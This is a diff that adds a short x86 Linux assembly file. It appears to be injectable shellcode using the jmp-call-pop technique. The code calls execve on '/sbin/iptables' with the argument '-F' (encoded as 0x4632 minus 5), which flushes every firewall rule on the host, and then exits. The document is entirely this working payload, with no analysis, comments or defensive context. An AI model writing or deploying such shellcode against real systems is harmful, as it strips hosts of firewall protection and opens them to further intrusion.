@@ -1,0 +1,30 @@
+global _start
+section .text
+
+_start:
+jmp shell
+code:
+cld
+pop edi
+xor edx,edx
+mov al , byte [edi]
+mov word dx , 0x4632
+add edx,-5
+push ecx
+push edx
+mov esi , esp
+inc edi
+mov ebx , edi
+push ecx
+push esi
+push ebx
+mov ecx, esp
+xor edx , edx
+int 0x80
+xor eax,eax
+xor ebx,ebx
+mov al , 0x1
+int 0x80
+shell:
+call code
+myvar db 0xb,0x2f,0x73,0x62,0x69,0x6e,0x2f,0x69,0x70,0x74,0x61,0x62,0x6c,0x65,0x73,0x00
